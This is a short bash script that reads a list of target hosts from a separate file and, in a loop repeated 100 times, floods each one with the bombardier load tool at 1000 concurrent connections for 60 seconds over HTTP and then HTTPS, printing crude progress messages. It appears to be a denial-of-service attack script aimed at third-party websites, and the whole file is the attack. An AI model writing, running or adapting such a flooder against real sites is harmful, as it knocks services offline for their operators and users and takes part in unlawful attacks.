#!/bin/bash

. ./fucklist.sh

for n in {1..100}; do 
    for i in "${fucklist[@]}"
        do
        echo "Fucking - $i"
        ./bombardier -c 1000 -d 60s -l http://$i --http1
        echo "Switching to https"
        ./bombardier -c 1000 -d 60s -l https://$i --http1
        echo "Fucked - $i"
        sleep 5
    done
done

